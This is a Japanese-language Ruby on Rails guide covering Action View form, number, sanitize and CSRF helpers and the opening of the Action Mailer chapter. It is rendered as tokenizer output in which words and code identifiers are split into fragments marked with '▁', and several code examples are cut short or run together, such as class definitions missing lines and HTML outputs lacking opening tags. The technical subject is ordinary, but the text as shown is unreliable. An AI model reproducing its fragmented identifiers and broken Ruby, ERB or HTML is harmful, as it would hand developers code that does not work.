▁ 特定の 属性 にアクセス するための ラ ジ オ ボタン タグを返します 。
▁#### ▁ text _ ar e a
▁ 特定の 属性 にアクセス するための 、 テキスト エ リ ア 用 開 始 タグ と 終 了 タグを返します 。
▁ text _ ar e a (: comment , ▁: text , ▁ size : ▁" 20 x 30 ")
▁# ▁=> ▁< text ar e a ▁c ol s =" 20 " ▁ row s =" 30 " ▁id =" comment _ text " ▁name =" comment [ text ] ">
▁# ▁# {@ comment . text }
▁# ▁</ text ar e a >
▁#### ▁ text _ field
▁ 特定の 属性 にアクセス するための 、 種類 が " text " の input タグを返します 。
▁#### ▁ email _ field
▁ 特定の 属性 にアクセス するための 、 種類 が " email " の input タグを返します 。
▁ email _ field (: user , ▁: email )
▁# ▁=> ▁< input ▁type =" email " ▁id =" user _ email " ▁name =" user [ email ] " ▁ value =" # {@ user . email } " ▁/>
▁#### ▁ url _ field
▁ 特定の 属性 にアクセス するための 、 種類 が " url " の input タグを返します 。
▁ url _ field (: user , ▁: url )
▁# ▁=> ▁< input ▁type =" url " ▁id =" user _ url " ▁name =" user [ url ] " ▁ value =" # {@ user . url } " ▁/>
▁### ▁ Form O p tion s Helper
▁ さまざまな 種類 の コ ン テ ナ を 1 つの オプション タグ の セット に まとめ るため の メソッドを 多 数 提供し ます 。
▁#### ▁ collection _ select
▁` select ` タグ と 、` object ` が 属 する クラスの メソッド 値 の 既存の 戻り値 を コレクション に した ` option ` タグを返します 。
▁ 例 として 、 このメソッド を 適 用 する オブジェクトの 構造 が 以下のように な っている とします 。
▁class ▁A
▁ belongs _ to ▁: author
▁class ▁A u th or ▁< ▁ActiveRecord :: Base
▁def ▁name _ with _ initial
▁" # { first _ name . first } . ▁# { last _ name } "
▁< option ▁ value =" "> P le as e ▁ select </ option >
▁< option ▁ value = "1" ▁ select ed =" select ed "> D . ▁ H e in e me i er ▁ H an s s on </ option >
▁< option ▁ value =" 2 "> D . ▁ T h o ma s </ option >
▁< option ▁ value =" 3 "> M . ▁C l ar k </ option >
▁</ select >
▁#### ▁ collection _ r ad io _ button s
▁` object ` が 属 する クラスの メソッド 値 の 既存の 戻り値 を コレクション に した ` r ad io _ button ` タグを返します 。
▁#### ▁ collection _ check _ box es
▁` object ` が 属 する クラスの メソッド 値 の 既存の 戻り値 を コレクション に した ` check _ box ` タグを返します 。
▁has _ and _ belongs _ to _ many ▁: author s
▁#### ▁ option _ group s _ from _ collection _ for _ select
▁` option ` タグ の 文字列 を返します 。 後 述 の ` options _ from _ collection _ for _ select ` と似ています が 、 引数 の オブジェクト リレーション に基いて ` o p t group ` タグ を使用する 点が 異なります 。
▁class ▁C on t in ent ▁< ▁ActiveRecord :: Base
▁has _ many ▁: count r ies
▁# ▁ attr i b s : ▁id , ▁name
▁class ▁ Co un t ry ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: con t in ent
▁# ▁ attr i b s : ▁id , ▁name , ▁ con t in ent _ id
▁ 使用 例 は以下のようになります 。
▁ option _ group s _ from _ collection _ for _ select (@ con t in ent s , ▁: count r ies , ▁: name , ▁: id , ▁: name , ▁3 )
▁ 出力結果 は以下のようになります 。
▁< o p t group ▁ label =" A f ri ca ">
▁< option ▁ value =" 1 "> E g y p t </ option >
▁< option ▁ value =" 4 "> R w and a </ option >
▁</ o p t group >
▁< o p t group ▁ label =" A s i a ">
▁< option ▁ value =" 3 " ▁ select ed =" select ed "> C h in a </ option >
▁< option ▁ value =" 12 "> In d i a </ option >
▁< option ▁ value =" 5 "> J a p an </ option >
▁NOT E : ▁ 返される のは ` o p t group ` タグ と ` option ` だけです 。 従って 、 出力結果 の 外 側 を 適切な ` select ` タグ で 囲 む 必要があります 。
▁#### ▁ options _ for _ select
▁ コ ン テ ナ ▁( ハッシュ 、 配列 、 enumera b le 、 独自の 型 ) ▁ を 引数として 受け 付け 、 オプション タグ の 文字列 を返します 。
▁ options _ for _ select ( [ ▁" V I S A ", ▁" M as ter C ar d " ▁ ] )
▁# ▁=> ▁< option > V I S A </ option > ▁< option > M as ter C ar d </ option >
▁NOT E : ▁ 返される のは ` option ` だけです 。 従って 、 出力結果 の 外 側 を 適切な HTML ▁` select ` タグ で 囲 む 必要があります 。
▁#### ▁ options _ from _ collection _ for _ select
▁` collection ` を 列 挙 した 結果を option タグ 化 した 文字列 を返し 、 呼び出し の 結果を ` value _ method ` に オプション 値 として 割り当て 、` text _ method ` に オプション テキスト として 割り当て ます 。
▁ options _ from _ collection _ for _ select ( collection , ▁ value _ method , ▁ text _ method , ▁ select ed ▁= ▁nil )
▁たとえば 、 @ pro j e ct . people に 入 っている person を ル ー プ で すべて 列 挙 して input タグ を作成する のであれば 、 以下の ようになります 。
▁ options _ from _ collection _ for _ select (@ pro j e ct . people , ▁" id ", ▁" name ")
▁# ▁=> ▁< option ▁ value =" # { person . id } "> # { person . name }< / option >
▁ 指定された オブジェクト と メソッド に従って 、 select タグ の中に 一 連 の option タグ を 含 んだ もの を作成します 。
▁< option ▁ value =" " ></ option >
▁< option ▁ value = "1" ▁ select ed =" select ed "> David </ option >
▁< option ▁ value =" 2 "> S am </ option >
▁< option ▁ value =" 3 "> To b i as </ option >
▁#### ▁ time _ zone _ options _ for _ select
▁ 世界 の ほぼ すべての タイムゾーン を含む オプション タグ の 文字列 を返します 。
▁#### ▁ time _ zone _ select
▁ time _ zone _ options _ for _ select を使用して オプション タグ を生成し 、 指定された オブジェクト と メソッド 用の select タグ と option タグを返します 。
▁ time _ zone _ select ( ▁" user ", ▁" time _ zone ")
▁#### ▁ date _ field
▁ 特定の 属性 にアクセス するための 、 種類 が " date " の input タグを返します 。
▁ date _ field (" user ", ▁" do b ")
▁### ▁ Form T a g Helper
▁ フォーム タグ を作成する ための メソッドを 多 数 提供し ます 。 これらの メソッドは 、 テンプレート に 割り当て られ ている Active ▁Record オブジェクト に 依 存 しない 点が Form Helper と 異なります 。
▁その 代 わ り 、 Form T a g Helper の メソッド では 名前 と 値を 個 別 に 指定 します 。
▁#### ▁ check _ box _ tag
▁ チェックボックス 用の フォーム input タグ を作成します 。
▁ check _ box _ tag ▁' accept '
▁# ▁=> ▁< input ▁id =" accept " ▁name =" accept " ▁type =" check box " ▁ value = "1" ▁/>
▁#### ▁ field _ set _ tag
▁ HTML フォーム 要素 を グループ 化 するための field set タグ を作成します 。
▁<%= ▁ field _ set _ tag ▁do ▁%>
▁< p > <%= ▁ text _ field _ tag ▁' name ' ▁%></ p >
▁# ▁=> ▁< field set >< p >< input ▁id =" name " ▁name =" name " ▁type =" text " ▁ / ></ p ></ field set >
▁#### ▁ file _ field _ tag
▁ ファイル アップロード 用の フィールド を作成します 。
▁<%= ▁ form _ tag ( { action : " post "} , ▁ m ulti part : ▁true ) ▁do ▁%>
▁< label ▁for =" file "> File ▁to ▁ U p load </ label > ▁<%= ▁ file _ field _ tag ▁" file " ▁%>
▁<%= ▁ submit _ tag ▁%>
▁ 出力 例 :
▁ file _ field _ tag ▁' attachment '
▁# ▁=> ▁< input ▁id =" attachment " ▁name =" attachment " ▁type =" file " ▁/>
▁#### ▁ form _ tag
▁` url _ for _ options ` で 設定 された URL への アクションに 送信 される フォーム タグ を作成します 。 これは ` ActionController :: Base # url _ for ` と似ています 。
▁< div > <%= ▁ submit _ tag ▁' S a ve ' ▁%></ div >
▁#### ▁ h id de n _ field _ tag
▁ フォーム input の 「 隠 し フィールド 」 を作成します 。 この 隠 し フィールド は 、 通常 であれば HTTP が ス テ ート レ ス であること によって 失 わ れる 可能性 のある データを 送信 したり 、 ユーザー から 見え ないように しておき たい データを 送信 するのに 使用されます 。
▁ h id de n _ field _ tag ▁' token ', ▁' V U B J K B 23 U I V I 1 U U 1 V O B V I @ '
▁# ▁=> ▁< input ▁id =" token " ▁name =" token " ▁type =" h id de n " ▁ value =" V U B J K B 23 U I V I 1 U U 1 V O B V I @ " ▁/>
▁#### ▁ image _ submit _ tag
▁ 送信 画像 を表示します 。 この 画像 を クリック すると フォーム が 送信 されます 。
▁ image _ submit _ tag (" login . png ")
▁# ▁=> ▁< input ▁src =" / images / login . png " ▁type =" image " ▁/>
▁#### ▁ label _ tag
▁ フィールド の ラ ベ ル を作成します 。
▁ label _ tag ▁' name '
▁# ▁=> ▁< label ▁for =" name "> Name </ label >
▁#### ▁ password _ field _ tag
▁ パスワード 用の フィールド を作成します 。 この フィールド への 入力 は マ ス ク 用 文字 で 隠 されます 。
▁ password _ field _ tag ▁' pass '
▁# ▁=> ▁< input ▁id =" pass " ▁name =" pass " ▁type =" password " ▁/>
▁#### ▁ r ad io _ button _ tag
▁ ラ ジ オ ボタン を作成します 。 ユーザーが 同じ オプション グループ 内 から 選択 できる よう 、 同じ name 属性 で ラ ジ オ ボタン を グループ 化 してください 。
▁ r ad io _ button _ tag ▁' g e nder ', ▁' ma le '
▁# ▁=> ▁< input ▁id =" g e nder _ ma le " ▁name =" g e nder " ▁type =" r ad io " ▁ value =" ma le " ▁/>
▁#### ▁ select _ tag
▁ ド ロ ッ プ ダ ウ ン 選択 ボックス を作成します 。
▁ select _ tag ▁" people ", ▁" < option > David </ option > "
▁# ▁=> ▁< select ▁id =" people " ▁name =" people " >< option > David </ option ></ select >
▁#### ▁ submit _ tag
▁ キ ャ プ ション として 指定された テキスト を使用して 送信 ボタン を作成します 。
▁#### ▁ text _ ar e a _ tag
▁ text ar e a タグ で テキスト 入力 エ リ ア を作成します 。 ブログ への 投 稿 や 説明 文 などの 長 い テキスト を入力する には text ar e a を ご 使用 ください 。
▁#### ▁ text _ field _ tag
▁ 通常の テキスト フィールド を作成します 。 ユーザー名 や 検索 キーワード 入力 用の フィールド には この 通常の テキスト フィールド を ご 使用 ください 。
▁ text _ field _ tag ▁' name '
▁# ▁=> ▁< input ▁id =" name " ▁name =" name " ▁type =" text " ▁/>
▁#### ▁ email _ field _ tag
▁ 種類 が ` email ` の 標準 入力 フィールド を作成します 。
▁ email _ field _ tag ▁' email '
▁# ▁=> ▁< input ▁id =" email " ▁name =" email " ▁type =" email " ▁/>
▁#### ▁ url _ field _ tag
▁ 種類 が ` url ` の 標準 入力 フィールド を作成します 。
▁ url _ field _ tag ▁' url '
▁# ▁=> ▁< input ▁id =" url " ▁name =" url " ▁type =" url " ▁/>
▁#### ▁ date _ field _ tag
▁ 種類 が ` date ` の 標準 入力 フィールド を作成します 。
▁ date _ field _ tag ▁" do b "
▁# ▁=> ▁< input ▁id =" do b " ▁name =" do b " ▁type =" date " ▁/>
▁### ▁ JavaScript Helper
▁ ビューで JavaScript を使用する ための 機能 を提供します 。
▁#### ▁ es ca p e _ javascript
▁ JavaScript セグメント から 改 行 ▁( C R ) ▁ と 一 重 引 用 符 と 二 重 引 用 符 を エスケープ します 。
▁#### ▁ javascript _ tag
▁ 渡 された コードを JavaScript 用 タグ に ラ ッ プ して 返します 。
▁ javascript _ tag ▁" alert (' A ll ▁is ▁ g oo d ') "
▁< script >
▁ alert (' A ll ▁is ▁ g oo d ')
▁ / / ] ] >
▁</ script >
▁### ▁ N um b er Helper
▁ 数値 を フォーマット 済み 文字列 に変換 する メソッド 群 を提供します 。
▁ サポート されている フォーマット は 電 話 番号 、 通 貨 、 パ ー セ ン ト 、 精 度 、 座 標 、 ファイル サイズ など です 。
▁#### ▁ number _ to _ c ur re n c y
▁ 数値 を 通 貨 表示 に変換 します ▁( $ 1 3 . 6 5 など )。
▁ number _ to _ c ur re n c y ( 1 23 4 5 6 7 8 9 0 . 50 ) ▁# ▁=> ▁$ 1 , 23 4 , 5 6 7 , 8 9 0 . 50
▁#### ▁ number _ to _ human _ size
▁ バ イ ト 数 を 読み やすい 形式 に フォーマット します 。 ファイル サイズ を ユーザーに 表示する 場合に 便利です 。
▁ number _ to _ human _ size ( 1 23 4 ) ▁# ▁=> ▁1. 2 ▁ K B
▁ number _ to _ human _ size ( 1 23 4 5 6 7 ) ▁# ▁=> ▁1. 2 ▁ M B
▁#### ▁ number _ to _ per c ent age
▁ 数値 を パ ー セ ン ト 文字列 に変換 します 。
▁ number _ to _ per c ent age ( 100 , ▁ pre c is ion : ▁0 ) ▁# ▁=> ▁ 100 %
▁#### ▁ number _ to _ ph one
▁ 数値 を 米 国 式 の 電 話 番号 に変換 します 。
▁ number _ to _ ph one ( 1 23 5 5 5 1 23 4 ) ▁# ▁=> ▁1 23 - 5 5 5 - 1 23 4
▁#### ▁ number _ with _ de limit er
▁ 数値 に 3 桁 ご と の 桁 区切 り 文字 を追加します 。
▁ number _ with _ de limit er ( 1 23 4 5 6 7 8 ) ▁# ▁=> ▁1 2, 3 4 5 , 6 7 8
▁#### ▁ number _ with _ pre c is ion
▁ 数値 を 指定された 精 度 ( ` pre c is ion ` ) に変換 します 。 デフォルトの 精 度 は 3 です 。
▁ number _ with _ pre c is ion ( 1 11 . 23 4 5 ) ▁# ▁=> ▁1 11 . 23 5
▁ number _ with _ pre c is ion ( 1 11 . 23 4 5 , ▁2 ) ▁# ▁=> ▁1 11 . 23
▁### ▁S an it ize Helper
▁S an it ize Helper モジュール は 、 望 ま しく ない HTML 要素 を 除 去 するための メソッド 群 を提供します 。
▁#### ▁ sanitize
▁ sanitize ▁@ article . body
▁: attributes オプション または : tag s オプション が 渡 される と 、 そこで 指定された タグ および 属性 のみ が 処理 の 対象 外 となります 。
▁ sanitize ▁@ article . body , ▁ tag s : ▁% w ( table ▁ tr ▁ td ) , ▁ attributes : ▁% w ( id ▁class ▁ style )
▁ さまざまな 用 途 に合わせて デフォルト 設定 を変更 できます 。 たとえば 以下のように デフォルトの タグ に table タグ を追加する とします 。
▁class ▁ Application ▁< ▁Rails :: Application
▁config . action _ view . sanitize d _ allow ed _ tag s ▁= ▁' table ', ▁' tr ', ▁' td '
▁#### ▁ sanitize _ css ( style )
▁ CSS コードを サ ニ タ イ ズ します 。
▁#### ▁ strip _ links ( html )
▁ リンク テキスト を 残 して リンク タグ をすべて 削除 します 。
▁ strip _ links (" < a ▁ href =" http :// rubyonrails . org "> Ruby ▁on ▁Rails </ a > ")
▁# ▁=> ▁Ruby ▁on ▁Rails
▁ strip _ links (" email s ▁to ▁< a ▁ href =" mail to : me @ email . com "> me @ email . com </ a > . ")
▁# ▁=> ▁ email s ▁to ▁ me @ email . com .
▁ strip _ links (' B log : ▁< a ▁ href =" http :// my blog . com / "> V is it </ a > . ')
▁# ▁=> ▁B log : ▁ V is it .
▁#### ▁ strip _ tag s ( html )
▁ HTML から HTML タグ をすべて 削除 します 。 HTML コメント も 削除 されます 。
▁このメソッド では HTML ス キ ャ ナ と HTML ト ー ク ナ イ ザ ▁( token ize r ) ▁ を使用し ており 、 HTML の 解 析 能 力 は ス キ ャ ナ の 能 力 に 依 存 しています 。
▁ strip _ tag s (" S tr ip ▁< i > the s e </ i > ▁ tag s ! ")
▁# ▁=> ▁S tr ip ▁the s e ▁ tag s !
▁ strip _ tag s (" < b > B ol d </ b > ▁ no ▁more !
▁< a ▁ href =' m or e . html ' > S e e ▁more </ a > ")
▁# ▁=> ▁B ol d ▁ no ▁more !
▁S e e ▁more
▁C A UT I ON : ▁この 出力 には エスケープ されていない ' < ' 、 ' > ' 、 ' & ' 文字 が 残 ること があり 、 それ によって ブラウザ が 期待どおり に 動作 し な くなる ことがあります 。
▁### ▁C s r f Helper
▁" c s r f - param " メ タ タグ と " c s r f - token " メ タ タグを返します 。 これらの 名 称 は それぞれ 、 ク ロ ス サイト リクエスト フ ォ ー ジ ェ リ ▁( CSRF : ▁c r o s s - site ▁ request ▁for e g e ry ) ▁ の パラメータ と トークン が 元 になっています 。
▁<%= ▁c s r f _ me t a _ tag s ▁%>
▁NOT E : ▁ 通常の フォーム では そのため の 隠 し フィールド が 生成される ので 、 これらの タグ は 使用 されません 。
▁ ロー カ ラ イ ズ された ビュー
▁Action ▁ View は 、 現在の ロケール に応じて さまざまな テンプレート を出力する ことができます 。
▁I 18 n . local e ▁= ▁: de
▁ ロー カ ラ イ ズ 版 の テンプレート が 見 当 たら ない場合は 、 装 飾 な し のバージョン が使用されます 。
▁つまり 、 ロー カ ラ イ ズ 版 ビュー が なくても 動作します が 、 ロー カ ラ イ ズ 版 ビュー があれば それ が使用されます 。
▁ 同じ要領で 、 public ディレクトリ の レ ス キュー ファイル ▁( い わ ゆ る エラー ページ ) ▁ も ロー カ ラ イ ズ できます 。
▁たとえば 、` I 18 n . local e ▁= ▁: de ` と 設定 し 、` public / 5 00 . de . html ` と ` public / 4 04 . de . html ` を作成する ことで 、 ロー カ ラ イ ズ 版 の レ ス キュー ページ を作成 できます 。
▁Rails は I 18 n . local e に 設定 できる シンボル を 制限 していない ので 、 ロー カ ラ イ ズ に か ぎ らず 、 あらゆる 状 況 に合わせて 異なる コンテンツ を表示し 分 け るように することができます 。
▁たとえば 、 エ キ ス パ ート ユーザー には 、 通常 ユーザー と 異なる 画面 を表示し たい とします 。
▁これ を行なう には 、` app / controllers / application . rb ` に 以下のように 追 記 します 。
▁ before _ action ▁: set _ ex per t _ local e
▁def ▁ set _ ex per t _ local e
▁I 18 n . local e ▁= ▁: ex per t ▁if ▁ current _ user . ex per t ?
▁詳細については 、[ Rails 国 際 化 ▁( I 18 n ) ▁API ]( i 18 n . html ) ▁ を参照してください 。
▁Active ▁Support
▁-- - ----
▁Action ▁ View
▁ date :
▁ R a il t ies
▁Action ▁Mailer ▁ の基礎
▁ 本 章では 、 アプリケーションで メールの 送 受信 を 行える ように するために 必要な すべての 事 項 と 、 Action ▁Mailer の さまざまな 内部 情報 を提供します 。
▁また 、 メイラー のテスト 方法 についても 説明します 。
▁* ▁Rails アプリケーションで メール を 送 受信 する方法
▁* ▁Action ▁Mailer クラス と メイラー ビュー の 生成 および 編集 方法
▁* ▁ 環境 に合わせて Action ▁Mailer を設定する 方法
▁* ▁Action ▁Mailer クラス のテスト 方法
▁Action ▁Mailer を使用することで 、 アプリケーションの メイラー クラス や ビューで メールを送信 することができます 。
▁ メイラー の動作 は コントローラ とき わ め て 似 通 っています 。
▁ メイラー は ` Action Mailer :: Base ` を継承し 、` app / mailer s ` に 配置 され 、` app / views ` にある ビュー と 結 び 付け られます 。
▁ メールを送信 する
▁この セクション では 、 メイラー と ビュー の作成 方法 を 手順 を 追 って 説明します 。
▁### ▁ メイラー 生成 の 全 手順
▁#### ▁ メイラー を作成する
▁$ ▁ bin / rails ▁ generate ▁ mailer ▁User Mailer
▁create ▁app / mailer s / user _ mailer . rb
▁create ▁app / mailer s / application _ mailer . rb
▁invo ke ▁ erb
▁create ▁app / views / user _ mailer
▁create ▁app / views / layouts / mailer . text . erb
▁create ▁app / views / layouts / mailer . html . erb
▁invo ke ▁test _ un it
▁create ▁test / mailer s / user _ mailer _ test . rb
▁create ▁test / mailer s / preview s / user _ mailer _ preview . rb
▁# ▁app / mailer s / application _ mailer . rb
▁class ▁ Application Mailer ▁< ▁Action Mailer :: Base
▁ default ▁ from : ▁" from @ example . com "
▁ layout ▁' mailer '
▁# ▁app / mailer s / user _ mailer . rb
▁class ▁User Mailer ▁< ▁ Application Mailer
▁ 上 に示した とおり 、 Rails の 他の ジェネレータ 同様 の 方法で メイラー を 生成 できます 。
▁ メイラー は 概念 上 コントローラ と 似 通 っ ており 、 メイラー を生成する と ▁( コントローラ と同様に ) ▁ ビュー の ディレクトリ と テスト も 同時に 生成されます 。
▁ ジェネレータ を使用した く ない場合は 、 app / mailer s ディレクトリ 以下 に ファイル を作成し 、` Action Mailer :: Base ` を継承し てください 。
▁class ▁ M y Mailer ▁< ▁Action Mailer :: Base
▁#### ▁ メイラー を 編集 する
▁ メイラー は Rails の コントローラ と 非常に 似 通 っています 。
▁ メイラー には 「 アクション 」 と呼ばれる メソッド があり 、 メールの コンテンツ を構成する の に ビュー を使用します 。
▁ コントローラ で HTML などの メール コンテンツ を生成し て 顧 客 に 送信 したい場合 、 その 箇所 で メイラー を使用して 、 送信 したい メッセージ を作成します 。
▁` app / mailer s / user _ mailer . rb ` には 空 の メイラー があります 。
▁` welcome _ email ` という名前の メソッド を追加し 、 ユーザーが 登録 した メールアドレス に メールを送信 できるように してみましょう 。
▁ default ▁ from : ▁' not if i cat ions @ example . com '
▁def ▁ welcome _ email ( user )
▁@ user ▁= ▁ user
▁@ url ▁= ▁' http :// example . com / login '
▁ mail ( to : ▁@ user . email , ▁ subject : ▁' Welcome ▁to ▁ M y ▁A w e some ▁S it e ')
▁上の メソッドで 使用されている 項目 について 簡単に 説明します 。
▁ 利用 可能な すべての オプション については 、「 Action ▁Mailer の 全 メソッド 」 セクション で ユーザー 設定 可能な 属性 を参照してください 。
▁* ▁` default ▁ Hash ` ▁- ▁ メイラー から 送信 する あらゆる メール で 使用される デフォルト値 の ハッシュ です 。
▁上の 例 の場合 、`: from ` ヘッダー に この クラスの すべての メッセージ で使用する 値を 1 つ 設定 しています 。
▁この 値 は メール ごとに 上 書き することもできます 。
▁* ▁` mail ` ▁- ▁ 実際の メール ・ メッセージ です 。 ここでは `: to ` ヘッダー と `: subject ` ヘッダー を渡して います 。
▁ コントローラ の場合 と同様 、 メイラー の メソッド 内で 定義された すべての インスタンス変数 は そのまま ビューで 使用できます 。
▁#### ▁ メイラー ビュー を作成する
▁` app / views / user _ mailer / ` ディレクトリ で ` welcome _ email . html . erb ` という ファイルを 1 つ 作成 してください 。
▁この ファイルを 、 HTML で フォーマット された メール テンプレート に します 。
▁D O C T Y P E ▁ html >
▁< me t a ▁ content =' text / html ; ▁ cha r set = UT F - 8 ' ▁ http - equ i v =' Content - Type ' ▁/>
▁< h 1> <%= ▁@ user . name ▁%> 様 、 example . com へ よう こ そ 。 </ h 1>
▁< p >
▁ example . com への サインアップ が 成功 しました 。
▁your ▁ user name ▁is : ▁<%= ▁@ user . login ▁%> . < br >
▁</ p >
▁この サイトに ログイン するには 、 <%= ▁@ url ▁%> をクリックして ください 。
▁< p > ご 入 会 あり が と う ご ざ います 。 どう ぞ お 楽 し み ください ま せ 。
▁続いて 、 同じ 内容 の テキスト メール も 作成 しましょう 。
▁ 顧 客 によって は HTML フォーマット の メール を受け取り たくない 人 も いる ので 、 テキスト メール も 作成 しておく の が 最 善 です 。
▁これ を行なう には 、` app / views / user _ mailer / ` ディレクトリ で ` welcome _ email . text . erb ` という ファイルを 以下の 内容 で 作成 してください 。
▁<%= ▁@ user . name ▁%> 様 、 example . com へ よう こ そ 。
▁= = ========= ========= ========= ========= =========
▁ example . com への サインアップ が 成功 しました 。 ユーザー名 は 「 <%= ▁@ user . login ▁%> 」 です 。
▁この サイトに ログイン するには 、 <%= ▁@ url ▁%> をクリックして ください 。
▁ 本 サイトに ユーザー登録 い ただ き あり が と う ご ざ います 。
▁ 現在の Action ▁Mailer では 、` mail ` メソッド を呼び出す と 2 種類 の テンプレート ▁( テキスト および HTML ) ▁ がある かどうか を探し 、` m ulti part / al ter n at ive ` 形式 の メール を 自動生成 します 。
▁#### ▁ メイラー を呼び出す
▁Rails の メイラー は 、 ビュー の レンダリング と 本 質 的に 同じ ことを 行 っています 。
▁ ビュー の レンダリング では HTTP プロトコル として 送信 されます が 、 メイラー では メールの プロトコル を経由して 送信 する 点 のみ が 異なります 。
▁従って 、 ユーザー 作成 に 成功 したときに メールを送信 する よう コントローラ から メイラー に 指示 する だけで 機能 する ようになります 。
▁ メイラー 呼び出し は 非常に 簡単 です 。
▁ 例 として 、 最初に scaffold で ` User ` を作成 してみましょう 。
▁$ ▁ bin / rails ▁ generate ▁ scaffold ▁ user ▁name ▁ email ▁ login
▁$ ▁ bin / rake ▁ db : migrate
▁ 説明 用の ユーザー モデル を作成し たので 、 続いて ` app / controllers / users _ controller . rb ` を 編集 し 、 新規ユーザー の 保存 成功 直 後に ` User Mailer ` の ` User Mailer . welcome _ email ` を使用して その ユーザーに メール が 送信 される ように しましょう 。
▁Action ▁Mailer は Active ▁Job と うまく 統合 されている ので 、 Web の リクエスト / レスポンス サ イ ク ル の 外 で 非 同 期 に メールを送信 できます 。 この おかげで 、 ユーザー は 送信 完了 を 待 つ 必要 が ありません 。
▁# ▁ POST ▁ / users
▁# ▁ POST ▁ / users . json
▁# ▁ 保存 後に User Mailer を使用して welcome メールを送信
▁User Mailer . welcome _ email (@ user ). deliver _ la ter
▁ format . html ▁ { ▁ redirect _ to (@ user , ▁ no tic e : ▁' ユーザーが 正常に 作成 されました 。 ')
▁ format . html ▁ { ▁render ▁ action : ▁' new ' ▁ }
▁NOT E : ▁Active ▁Job はデフォルトで ジョブ を ' : in line ' で 実行 します 。
▁ したがって 、 この時点で ` deliver _ la ter ` を使用して メールを送信 できます 。 また 、 メール を 後 で バ ッ ク グ ラ ウ ンド ジョブ から 送信 したい場合は 、 S id e k i q や Re s que などの バ ッ ク エ ンド クエリ システム を使用する よう Active ▁Job を設定する だけで 済み ます 。
▁ メール を c r on j o b など から 今 すぐ 送信 したい場合は 、` deliver _ now ` を呼び出す だけで 済み ます 。
▁class ▁S end W e e k ly S um m ary
▁def ▁run
▁User . find _ each ▁do ▁| user |
▁User Mailer . week ly _ sum m ary ( user ). deliver _ now
▁この ` welcome _ email ` メソッドは ` Action Mailer :: M ess age D e livery ` オブジェクトを 1 つ 返します 。 この オブジェクトは 、 その メール 自身 が 送信 対象 であることを ` deliver _ now ` や ` deliver _ la ter ` に 伝 え ます 。
▁` Action Mailer :: M ess age D e livery ` オブジェクトは 、` Mail :: M ess age ` を ラ ッ プ しています 。
▁ 内部 の ` Mail :: M ess age ` オブジェクトの 表示 や 変更 など を行い たい場合は 、` Action Mailer :: M ess age D e livery ` オブジェクトの ` message ` メソッド にアクセス します 。
▁### ▁ ヘッダー の 値を 自動 エンコード する
▁Action ▁Mailer は 、 メールの ヘッダー や 本 文 の マ ル チ バ イ ト 文字 を 自動的に エンコード します 。
▁ 別の 文字 セット を 定義 したい場合 や 、 事 前に 手動で 別の エンコード を行って お き たい 場合 などの 複雑な 事 例 については 、[ Mail ]( https :// github . com / m i ke l / mail ) ライブラリ を参照してください 。
▁### ▁Action ▁Mailer の 全 メソッド
▁以下の 3 つの メソッド を使用すれば 、 ほとんど の メール 送信 を カ バー できます 。
▁* ▁` header s ` ▁- ▁ メール に追加 したい ヘッダー を指定します 。
▁ メール ヘッダー の フィールド 名 と 値 の ペ ア を ハッシュ に まとめ て 渡す こともできます し 、` header s [: field _ name ] ▁= ▁' value ' ` のように 呼 び 出 す こともできます 。
▁* ▁` attachment s ` ▁- ▁ メール に ファイルを 添 付 します 。
▁` attachment s [' file - name . j p g '] ▁= ▁ File . read (' file - name . j p g ') ` のように 記述 します 。
▁* ▁` mail ` ▁- ▁ 実際の メール 自身 を送信し ます 。
▁このメソッド には ヘッダー の ハッシュ を パラメータ として 渡す ことができます 。 メソッド を呼び出す と 、 定義 して お いた メール テンプレート に応じて 、 プ レ ー ン テキスト メール または マ ル チ パ ート メールを送信 します 。
▁#### ▁ ファイルを 添 付 する
▁Action ▁Mailer では ファイル を簡単に 添 付 できます 。
▁* ▁ ファイル名 と コンテンツ を 渡す と 、 Action ▁Mailer と [ Mail ▁gem ]( https :// github . com / m i ke l / mail ) が自動的に m im e _ type を 推測 し 、 エンコード を 設定 して ファイルを 添 付 します 。
▁ attachment s [' file name . j p g '] ▁= ▁ File . read (' / path / to / file name . j p g ')
▁` mail ` メソッドを トリガ ー すると 、 マ ル チ パ ート 形式 の メール が 1 つ 送信 されます 。 送信 される メール は 、 ト ッ プ レベル が ` m ulti part / m i x ed ` で 最初の パ ート が ` m ulti part / al ter n at ive ` という 正しい 形式 で ネスト している 、 プ レ ー ン テキスト メール または HTML メール です 。
▁NOT E : ▁ メール に 添 付 される ファイル は自動的に Base 64 で エンコード されます 。
▁ 他の エンコード を使用したい場合 、 事 前に 好 み の エンコード を 適 用 した コンテンツ を ` Hash ` で エンコード して から ` attachment s ` に 渡します 。
▁* ▁ ヘッダー と コンテンツ を指定して ファイル名 を 渡す と 、 それらの 設定 が Action ▁Mailer と Mail によって 使用されます 。
▁ en code d _ content ▁= ▁S p ec i al E n code ( File . read (' / path / to / file name . j p g ') )
▁ attachment s [' file name . j p g '] ▁= ▁ {
▁ m im e _ type : ▁' application / x - g z ip ',
▁ en co d ing : ▁' S p ec i al E n co d ing ',
▁ content : ▁ en code d _ content
▁NOT E : ▁ エ ン コ ー デ ィ ング の 種類 を指定すると 、 Mail は コンテンツ が 既に エンコード 済み である と 判 断 し 、 Base 64 による エンコード を行い ません 。
▁#### ▁ ファイルを イン ラ イン で 添 付 する
▁Action ▁Mailer ▁ 3.0 は ファイルを イン ラ イン 添 付 できます 。 この 機能 は 3.0 より 前に 行われた 多数の ハ ッ ク を 基 に 、 理 想 に 近 づ け る べ く シンプルな 実装 にしたもの です 。
▁* ▁ イン ラ イン 添 付 を使用すること を Mail に 指示 するには 、 Mailer 内の attachment s メソッド に対して ` # in line ` を呼び出す だけで 済み ます 。
▁def ▁ welcome
▁ attachment s . in line [' image . j p g '] ▁= ▁ File . read (' / path / to / image . j p g ')
▁* ▁続いて 、 ビューで ` attachment s ` を ハッシュ として 参 照 し 、 表示 したい 添 付 ファイル を指定する ことができます 。 これ を行なう には 、` attachment s ` に対して ` url ` を 呼び出し 、 その 結果を ` image _ tag ` メソッド に 渡します 。
▁` ` ` html + erb
▁< p > こ ん に ち は 、 以下の 写 真 です 。 </ p >
▁<%= ▁ image _ tag ▁ attachment s [' image . j p g '] . url ▁%>
▁* ▁これは ` image _ tag ` に対する 標準的な 呼び出し である ため 、 画像 ファイル を扱う 時 と同様 、 添 付 URL の 後に も オプション の ハッシュ を 1 つ 置 く ことができます 。
▁<%= ▁ image _ tag ▁ attachment s [' image . j p g '] . url , ▁ alt : ▁' M y ▁P h o to ', ▁class : ▁' photos ' ▁%>
▁#### ▁ メール を 複数の 相手 に 送信 する
